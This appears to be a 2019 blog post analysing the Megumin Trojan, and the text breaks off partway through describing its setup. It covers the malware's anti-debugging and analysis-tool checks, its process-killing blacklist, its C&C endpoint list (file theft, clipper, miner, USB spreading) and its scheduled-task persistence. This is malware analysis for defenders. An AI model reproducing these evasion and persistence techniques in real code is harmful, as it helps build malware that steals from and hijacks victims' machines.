<meta name="twitter:text:title" content="Let&#8217;s nuke Megumin Trojan" />
<meta name="twitter:image" content="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/jens-johnsson-346357-unsplash.jpg?resize=1200%2C1200&#038;ssl=1&#038;w=640" />
<meta name="twitter:card" content="summary_large_image" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/05/saber.jpeg?fit=32%2C26&#038;ssl=1" sizes="32x32" />
<link rel="icon" href="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/05/saber.jpeg?fit=192%2C156&#038;ssl=1" sizes="192x192" />
<link rel="apple-touch-icon" href="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/05/saber.jpeg?fit=180%2C146&#038;ssl=1" />
<meta name="msapplication-TileImage" content="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/05/saber.jpeg?fit=249%2C202&#038;ssl=1" />

</head>
<body class="post-template-default single single-post postid-660 single-format-standard has-site-icon lets-nuke-megumin-trojan">
	<div class="wrapper">
		<header class="header clear" role="banner">
			<div class="container">
				<nav class="navbar navbar-expand-lg navbar-dark " role="navigation">
										<a class="navbar-brand" href="https://fumik0.com">
						<img src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/05/saber.jpeg?fit=32%2C26&#038;ssl=1" alt="Logo" class="logo-img">
					</a>
					
											<div id="mynote-nav-bar" class="collapse navbar-collapse"><ul id="menu-primary" class="navbar-nav mr-auto"><li  id="menu-item-8"class="nav-item"><a href="/" class="nav-link">Home</a></li><li  id="menu-item-595"class="nav-item"><a href="http://tracker.fumik0.com" class="nav-link">Tracker</a></li><li  id="menu-item-786"class="nav-item"><a href="https://twitter.com/fumik0_" class="nav-link">Twitter</a></li><li  id="menu-item-9"class="nav-item"><a href="https://fumik0.com/about/" class="nav-link">About</a></li><li  id="menu-item-10"class="nav-item"><a href="https://fumik0.com/contact/" class="nav-link">Contact</a></li></ul></div>					
					<div class="search-bar">
						
<form id="search-form" class="search" method="get" action="https://fumik0.com" role="search" autocomplete="off">
	<input type="text" name="s" class="search-input" placeholder="To search, type and hit enter.">
	<span class="search-icon" onclick="document.getElementById('search-form').submit();"><i class="fas fa-search"></i></span>
</form>


					</div>
					
					<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#mynote-nav-bar" aria-controls="mynote-nav-bar" aria-expanded="false" aria-label="Toggle navigation">
						<span class="navbar-toggler-icon"></span>
					</button>
				</nav>
			</div><!-- .container -->
		</header>


		

		<div class="single-post-title-bar clear" role="banner">
			<div class="container">
				<nav class="navbar navbar-expand-lg navbar-dark" role="navigation">
					<a class="navbar-brand" href="https://fumik0.com"></a>
					<div id="progress-title"></div>
				</nav>
			</div>
			<div class="progress-wrapper">
				<div class="progress-label"></div>
				<progress></progress>
			</div>
		</div>
	
<div class="data-schema is-single" itemscope itemtype="http://schema.org/Article">
											<nav class="breadcrumb">
			<div class="container">
				<ul class="breadcrumb" itemscope itemtype="http://schema.org/BreadcrumbList">
					<li class="breadcrumb-item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
						<a href="https://fumik0.com" itemprop="item">
							<span itemprop="name"><i class="fas fa-globe"></i><span class="sr-only">Home</span></span>
						</a>
						<meta itemprop="position" content="1">
					</li>
										<li class="breadcrumb-item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
						<a href="https://fumik0.com/category/reverse/" itemprop="item">
							<span itemprop="name">Reverse</span>
						</a>
						<meta itemprop="position" content="2">
					</li>
															<li class="breadcrumb-item active" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
						<span itemprop="name">Let&#8217;s nuke Megumin Trojan</span>
						<meta itemprop="item" content="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/">
						<meta itemprop="position" content="3">
					</li>
				</ul>
			</div>
		</nav>
		
			<div class="single-post-header">
				<div class="container">

					<h1 id="post-title" itemprop="headline">Let&#8217;s nuke Megumin Trojan</h1>
					<div class="post-mynote-buttons">

															<div class="btn-group column-control">
			<div class="btn-counter text-only active" data-target="#aside-container" role="button">		
				<div class="btn"><i class="fas fa-columns"></i></div>
			</div>
			<div class="btn-counter text-only" data-target="#sidebar" role="button">		
				<div class="btn"><i class="fas fa-list-ul"></i></div>
			</div> 
		</div>
							
												
		<a href="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/#comments" class="button-like-link">
			<div class="btn-counter">
				<div class="btn">
					<i class="fas fa-comment-dots"></i>
				</div>
				<div class="count-box">0</div>
			</div>
		</a>
						</div><!-- .post-mynote-buttons -->

											<div class="post-meta">
							<div class="author-posted-date"><img src="https://secure.gravatar.com/avatar/60460a1a0d00b32720a59ee2624bb4aa?s=40&#038;d=identicon&#038;r=g" class="rounded-circle poster-avatar" align="middle"> <a href="https://fumik0.com/author/fumko/" title="written May 3, 2019 @ 11:05 am" class="author-link">fumko</a> <time itemprop="datePublished" datetime="2019-05-03T11:05:02+00:00">written 6 years ago</time></div>						</div>
					
				</div><!-- .container -->
			</div><!-- .single-post-header -->

			
	<div class="container">
		<div class="row row-layout-choice-post">
			<main id="main-container" class="col-lg-8 col-md-8 col-sm-12" role="main">

				
					
						
						<article id="post-660" class="markdown-body post-660 post type-post status-publish format-standard has-post-thumbnail hentry category-reverse">

																	<figure>
			<img src="https://fumik0.com/wp-content/uploads/2019/05/jens-johnsson-346357-unsplash.jpg" class="attachment- size- wp-post-image" alt="" itemprop="image" decoding="async" fetchpriority="high" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/jens-johnsson-346357-unsplash.jpg?w=4272&amp;ssl=1 4272w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/jens-johnsson-346357-unsplash.jpg?resize=300%2C200&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/jens-johnsson-346357-unsplash.jpg?resize=768%2C512&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/jens-johnsson-346357-unsplash.jpg?resize=1024%2C683&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/jens-johnsson-346357-unsplash.jpg?resize=360%2C240&amp;ssl=1 360w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/jens-johnsson-346357-unsplash.jpg?resize=600%2C400&amp;ssl=1 600w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/jens-johnsson-346357-unsplash.jpg?w=1800&amp;ssl=1 1800w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/jens-johnsson-346357-unsplash.jpg?w=2700&amp;ssl=1 2700w" sizes="(max-width: 4272px) 100vw, 4272px" data-attachment-id="702" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/jens-johnsson-346357-unsplash/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/jens-johnsson-346357-unsplash.jpg?fit=4272%2C2848&amp;ssl=1" data-orig-size="4272,2848" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="jens-johnsson-346357-unsplash" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/jens-johnsson-346357-unsplash.jpg?fit=300%2C200&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/jens-johnsson-346357-unsplash.jpg?fit=900%2C600&amp;ssl=1" />			<figcaption></figcaption>
		</figure>
								
							<div itemprop="articleBody">
								<p>When you are a big fan of the <a href="https://myanimelist.net/anime/30831/Kono_Subarashii_Sekai_ni_Shukufuku_wo">Konosuba</a> franchise, you are a bit curious when you spot a malware called &#8220;Megumin Trojan&#8221; (Written in C++) on some selling forums and into some results of sandbox submissions. Before some speculation about when this malware has appeared, this one is not recent and there are some elements that prove it was present on the market since the beginning of 2018.</p>
<p>Since the last days, there is an increased activity related to a new version that was probably launched not so long ago (a v2), and community started to talk about it, but a lot of them has misinterpretation with Vidar due to the utilization of the same boundary beacon string. This analysis will help you to definitely clarify how to spot and understand how Megumin Trojan is working and it definitely has a specific signature, that you can&#8217;t miss it with you dig on it (for both network activities &amp; code).</p>
<p>This malware is a Trojan who has a bunch of features:</p>
<ul>
<li>DDoS</li>
<li>Miner</li>
<li>Clipper</li>
<li>Loader</li>
<li>Executing DOS commands on bots</li>
<li>Uploading specific files from bots to C&amp;C</li>
</ul>
<p>It&#8217;s time to reverse a little all of that 🙂</p>
<h2>Anti-Analysis Techniques</h2>
<h3>The classy PEB</h3>
<p>This malware is using one of the classiest tricks for detecting that the process is currently debugged, by checking a specific field into the <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winternl/ns-winternl-_peb">Process Environment Block</a> (PEB). For those who are unfamiliar with this, it&#8217;s a structure that contains all process information.</p>
<pre><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PEB</span> {</span> 
  BYTE Reserved1[<span class="hljs-number">2</span>]; 
  BYTE BeingDebugged; // HERE
  ...&lt; Other fields &gt;...
  PVOID Reserved12[<span class="hljs-number">1</span>]; 
  ULONG SessionId; 
} PEB, *PPEB;</pre>
<p>For our case, the value &#8220;BeingDebugged&#8221; will be &#8220;obviously&#8221; checked. But how it looks like when reversing it? Here it&#8217;s looking like this.</p>
<p><img data-recalc-dims="1" decoding="async" data-attachment-id="673" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_peb/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_peb.png?fit=564%2C251&amp;ssl=1" data-orig-size="564,251" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_peb" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_peb.png?fit=300%2C134&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_peb.png?fit=564%2C251&amp;ssl=1" class=" size-full wp-image-673 alignnone" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_peb.png?resize=564%2C251&#038;ssl=1" alt="megumin_peb" width="564" height="251" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_peb.png?w=564&amp;ssl=1 564w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_peb.png?resize=300%2C134&amp;ssl=1 300w" sizes="(max-width: 564px) 100vw, 564px" /></p>
<ul>
<li>fs:[18] is where is located the <a href="https://docs.microsoft.com/fr-fr/windows/desktop/api/winternl/ns-winternl-_teb">Thread Environment Process </a>(TEB)</li>
<li>ds:[eax+30] is necessary to have access into the PEB, that is part of the TEB.</li>
<li>ds[eax+2] remains to retrieve the value TEB.PEB.BeingDebugged</li>
</ul>
<p><img data-recalc-dims="1" decoding="async" data-attachment-id="674" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_peb_value/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_peb_value.png?fit=531%2C98&amp;ssl=1" data-orig-size="531,98" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_peb_value" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_peb_value.png?fit=300%2C55&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_peb_value.png?fit=531%2C98&amp;ssl=1" class=" size-full wp-image-674 alignnone" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_peb_value.png?resize=531%2C98&#038;ssl=1" alt="megumin_peb_value" width="531" height="98" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_peb_value.png?w=531&amp;ssl=1 531w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_peb_value.png?resize=300%2C55&amp;ssl=1 300w" sizes="(max-width: 531px) 100vw, 531px" /></p>
<p>This one has been used multiple times during the execution process of Megumin Trojan.</p>
<h3>Window Title</h3>
<p>This other trick used here is to get the title of the program and comparing it with a list of strings. For achieving it, the malware is calling <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getforegroundwindow">GetForegroundWindow</a> at first for the Windows of the current process and then grabbing the title with the help of <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getwindowtexta">GetWindowTextA</a>.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="675" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_anti_01/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_anti_01.png?fit=535%2C124&amp;ssl=1" data-orig-size="535,124" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_anti_01" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_anti_01.png?fit=300%2C70&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_anti_01.png?fit=535%2C124&amp;ssl=1" class="alignnone size-full wp-image-675" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_anti_01.png?resize=535%2C124&#038;ssl=1" alt="megumin_anti_01" width="535" height="124" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_anti_01.png?w=535&amp;ssl=1 535w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_anti_01.png?resize=300%2C70&amp;ssl=1 300w" sizes="auto, (max-width: 535px) 100vw, 535px" /></p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="676" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_anti_02/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_anti_02.png?fit=646%2C50&amp;ssl=1" data-orig-size="646,50" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_anti_02" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_anti_02.png?fit=300%2C23&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_anti_02.png?fit=646%2C50&amp;ssl=1" class="alignnone size-full wp-image-676" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_anti_02.png?resize=646%2C50&#038;ssl=1" alt="megumin_anti_02" width="646" height="50" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_anti_02.png?w=646&amp;ssl=1 646w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_anti_02.png?resize=300%2C23&amp;ssl=1 300w" sizes="auto, (max-width: 646px) 100vw, 646px" /></p>
<p>The comparison with the string is done step by step, by decrypting first the XOR string and comparing it with the Window Title, and continuing the functions until every value is checked.</p>
<div class="tiled-gallery type-rectangular tiled-gallery-unresized" data-original-width="900" data-carousel-extra='{&quot;blog_id&quot;:1,&quot;permalink&quot;:&quot;https:\/\/fumik0.com\/2019\/05\/03\/lets-nuke-megumin-trojan\/&quot;,&quot;likes_blog_id&quot;:140610880}' itemscope itemtype="http://schema.org/ImageGallery" > <div class="gallery-row" style="width: 900px; height: 97px;" data-original-width="900" data-original-height="97" > <div class="gallery-group images-1" style="width: 636px; height: 97px;" data-original-width="636" data-original-height="97" > <div class="tiled-gallery-item tiled-gallery-item-large" itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject"> <a href="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_anti_03/" border="0" itemprop="url"> <meta itemprop="width" content="632"> <meta itemprop="height" content="93"> <img decoding="async" class="" data-attachment-id="677" data-orig-file="https://fumik0.com/wp-content/uploads/2019/04/megumin_anti_03.png" data-orig-size="704,104" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_anti_03" data-image-description="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_anti_03.png?fit=300%2C44&#038;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_anti_03.png?fit=704%2C104&#038;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_anti_03.png?w=632&#038;h=93&#038;ssl=1" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_anti_03.png?w=704&amp;ssl=1 704w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_anti_03.png?resize=300%2C44&amp;ssl=1 300w" width="632" height="93" loading="lazy" data-original-width="632" data-original-height="93" itemprop="http://schema.org/image" title="megumin_anti_03" alt="megumin_anti_03" style="width: 632px; height: 93px;" /> </a> </div> </div> <!-- close group --> <div class="gallery-group images-1" style="width: 264px; height: 97px;" data-original-width="264" data-original-height="97" > <div class="tiled-gallery-item tiled-gallery-item-large" itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject"> <a href="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_anti_04/" border="0" itemprop="url"> <meta itemprop="width" content="260"> <meta itemprop="height" content="93"> <img decoding="async" class="" data-attachment-id="678" data-orig-file="https://fumik0.com/wp-content/uploads/2019/04/megumin_anti_04.png" data-orig-size="356,128" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_anti_04" data-image-description="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_anti_04.png?fit=300%2C108&#038;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_anti_04.png?fit=356%2C128&#038;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_anti_04.png?w=260&#038;h=93&#038;ssl=1" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_anti_04.png?w=356&amp;ssl=1 356w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_anti_04.png?resize=300%2C108&amp;ssl=1 300w" width="260" height="93" loading="lazy" data-original-width="260" data-original-height="93" itemprop="http://schema.org/image" title="megumin_anti_04" alt="megumin_anti_04" style="width: 260px; height: 93px;" /> </a> </div> </div> <!-- close group --> </div> <!-- close row --> </div>
<p>The completed string list :</p>
<ul>
<li>OllyDbg</li>
<li>IDA</li>
<li>ImmunityDebugger</li>
<li>inDb (Remain to WinDbg)</li>
<li>LordP (Remains to LordPE)</li>
<li>ireshark  (Remains to Wireshark)</li>
<li>HTTP Analyzer</li>
</ul>
<p>This technique here is not able to work completely because it&#8217;s checking the Windows Title of the current process used and so, some strings won&#8217;t be able to work at all. When I was reversing it, I didn&#8217;t understand at all why it was done like this, maybe something that was done fast or another unrelated explanation and we will never know.</p>
<h3>Dynamic Process Blacklist</h3>
<p>When the malware is fully configured, it performs an HTTP POST request called /blacklist. The answer contains a list of processes that the attacker wants to kill whenever the payload is active, the content is encoded in base64 format.</p>
<p>When processes are flagged as blacklisted, those are stored into variables as Process Handles, and they are checked and killed by a simple comparison. For terminating them the <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntddk/nf-ntddk-zwterminateprocess">ZwTerminateProcess</a> (or NtTerminateProcess if you are looking on a disassembler) API call is used and after the accomplishment of the task, the value on memory is initialized again to -1 for continuing, again and again, to maintain that these processes will never be able to be active whenever the malware is up.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="696" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_blacklist_kill/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_blacklist_kill.png?fit=636%2C189&amp;ssl=1" data-orig-size="636,189" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_blacklist_kill" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_blacklist_kill.png?fit=300%2C89&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_blacklist_kill.png?fit=636%2C189&amp;ssl=1" class="alignnone size-full wp-image-696" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_blacklist_kill.png?resize=636%2C189&#038;ssl=1" alt="megumin_blacklist_kill" width="636" height="189" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_blacklist_kill.png?w=636&amp;ssl=1 636w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_blacklist_kill.png?resize=300%2C89&amp;ssl=1 300w" sizes="auto, (max-width: 636px) 100vw, 636px" /></p>
<p>By default, all values are set to -1 (0xFFFFFFFF)</p>
<h2>Network interactions list</h2>
<p>Megumin is quite noisy, in term of interactions between bots and the C&amp;C, and the amount of API request is more than usual compared to the other malwares that I have  analyzed. So to make as much as possible simple and understandable, I classified them into three categories.</p>
<h3>General commands</h3>
<table border="0" cellspacing="0">
<colgroup width="124"></colgroup>
<colgroup width="344"></colgroup>
<tbody>
<tr>
<td align="left" height="17">/suicide</td>
<td align="left">Killing request</td>
</tr>
<tr>
<td align="left" height="17">/config</td>
<td align="left">Malware config</td>
</tr>
<tr>
<td align="left" height="17">/msgbox</td>
<td align="left">Fake message prompt window</td>
</tr>
<tr>
<td align="left" height="17">/isClipper</td>
<td align="left">is Clipper activated</td>
</tr>
<tr>
<td align="left" height="17">/isUSB</td>
<td align="left">Is set up to spread itself on removable drives</td>
</tr>
<tr>
<td align="left" height="17">/blacklist</td>
<td align="left">Process blacklist</td>
</tr>
<tr>
<td align="left" height="17">/wallets</td>
<td align="left">Wallet config for the clipper part</td>
</tr>
<tr>
<td align="left" height="17">/selfDel</td>
<td align="left">Removing the payload of the original PE</td>
</tr>
</tbody>
</table>
<h3>Bot commands</h3>
<table border="0" cellspacing="0">
<colgroup width="124"></colgroup>
<colgroup width="344"></colgroup>
<tbody>
<tr>
<td align="left" height="17">/addbot?hwid=</td>
<td align="left">Add a new bot to the C&amp;C (*)</td>
</tr>
<tr>
<td align="left" height="17">/task?hwid=</td>
<td align="left">Ask for a task</td>
</tr>
<tr>
<td align="left" height="17">/completed?hwid=</td>
<td align="left">Tell the C&amp;C that task has been done</td>
</tr>
<tr>
<td align="left" height="17">/gate?hwid=</td>
<td align="left">Gate for uploading/stealing specific files from bot to C&amp;C</td>
</tr>
<tr>
<td align="left" height="17">/reconnecttime</td>
<td align="left">Amount of time for next request between bot and C&amp;C</td>
</tr>
</tbody>
</table>
<p>(*) Only when the User-Agent is strictly configured as &#8220;<strong>Megumin/2.0</strong>&#8221;</p>
<h3>Miner commands</h3>
<table border="0" cellspacing="0">
<colgroup width="124"></colgroup>
<colgroup width="344"></colgroup>
<tbody>
<tr>
<td align="left" height="17">/cpu</td>
<td align="left">CPU Miner configuration</td>
</tr>
<tr>
<td align="left" height="17">/gpuAMD</td>
<td align="left">GPU AMD Miner Configuration</td>
</tr>
<tr>
<td align="left" height="17">/gpuNVIDIA</td>
<td align="left">GPU NVIDIA Miner Configuration</td>
</tr>
</tbody>
</table>
<p><em><strong>As a reminder, all response from the server are encoded in base64 with the only exception of the /config one, which is in clear.</strong></em></p>
<p>Curiosity: This malware is also using the same boundary beacon as Vidar and some other malware.</p>
<h2>That &#8220;messy&#8221; setup</h2>
<p>This trojan is quite curious about how it&#8217;s deploying itself and the first time I was trying to understand the mess, I was like, seriously what the heck is wrong with the logic of this malware. After that, I thought it was just the only thing weird with megumin, but no. To complexify the setup, interactions with the C&amp;C are different between different stages.</p>
<p>For explaining everything, I decided to split it into multiple steps, to slowly understand the chronological order of it.</p>
<h3>Step 1</h3>
<ul>
<li>In the first request, the malware is downloading a payload named &#8220;reserv.exe&#8221;. if this file is not empty it means the current payload is not the main build of the malware. reserv.exe is downloaded and saved into a specific folder hidden in %PROGRAMDATA% as &#8220;{MACHINE_GUID}&#8221; (for example <em>{656a1cdc-0ae0-40d0-a8bb-fdbd603c3b13}</em>),this file at the end is renamed as &#8220;update.exe&#8221;.</li>
<li>Then two or three requests are performed
<ul>
<li>/suicide</li>
<li>/msgbox</li>
<li>/selfDel (optional)</li>
</ul>
</li>
<li>A scheduled task is created with this specific pattern for the persistence, the name of the payload will be &#8220;update.exe&#8221; and another one on the registry.
<ul>
<li>&#8220;Scheduled Updater &#8211; {*MACHINE_GUID*}&#8221;</li>
</ul>
</li>
<li style="text-align: left;">Then the payload is killed and removed</li>
</ul>
<p><em>Reminder: If the malware was not fast enough to download reserv.exe for whatever reasons, it is named by a random windows process name, and will continue the process over and over until it will grab reserv.exe</em></p>
<p><em>Curiosity: The way this malware is creating a folder into PROGRAMDATA is strictly the same way as Arkei, <a href="https://blog.malwarebytes.com/threat-analysis/2019/04/say-hello-baldr-new-stealer-market/">Baldr</a>, <a href="https://unit42.paloaltonetworks.com/unit42-smoking-rarog-mining-trojan/">Rarog</a> &amp; <a href="https://tracker.fumik0.com/malware/Supreme++">Supreme++</a> (Rarog fork).</em></p>
<p>Megumin</p>
